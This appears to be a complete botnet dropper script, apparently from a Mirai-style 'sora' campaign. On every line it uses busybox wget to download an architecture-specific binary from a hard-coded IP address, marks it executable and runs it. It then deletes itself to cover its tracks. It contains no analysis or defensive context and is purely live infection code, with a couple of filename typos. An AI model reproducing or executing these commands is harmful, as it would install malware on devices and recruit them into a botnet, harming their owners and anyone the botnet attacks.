busybox wget  http://196.251.73.7/bins/sora.arm; chmod 777 fbot.arm; ./sora.arm android
busybox wget  http://196.251.73.7/bins/sora.arm5; chmod 777 sora.arm5; ./sora.arm5 android
busybox wget  http://196.251.73.7/bins/sora.arm6; chmod 777 sora.arm6; ./sora.arm6 android
busybox wget  http://196.251.73.7/bins/sora.arm7; chmod 777 sora.arm7; ./sora.arm7 android
busybox wget  http://196.251.73.7/bins/sora.m68k; chmod 777 sora.m68k; ./sora.m68k android
busybox wget  http://196.251.73.7/bins/sora.mips; chmod 777 sora.mips; ./sora.mips android
busybox wget  http://196.251.73.7/bins/sora.mpsl; chmod 777 sora.mpsl; ./sora.mpsl android
busybox wget  http://196.251.73.7/bins/sora.ppc; chmod 777 sora.ppc; ./sora.ppc android
busybox wget  http://196.251.73.7/bins/sora.sh4; chmod 777 sora.sh4; ./sora.sh4 android
busybox wget  http://196.251.73.7/bins/sora..spc; chmod 777 sora.spc; ./sora.spc android
busybox wget  http://196.251.73.7/bins/sora.x86; chmod 777 sora.x86; ./sora.x86 android
busybox wget  http://196.251.73.7/bins/sora.x86_64; chmod 777 sora.x86_64; ./sora.x86_64 android

rm $0
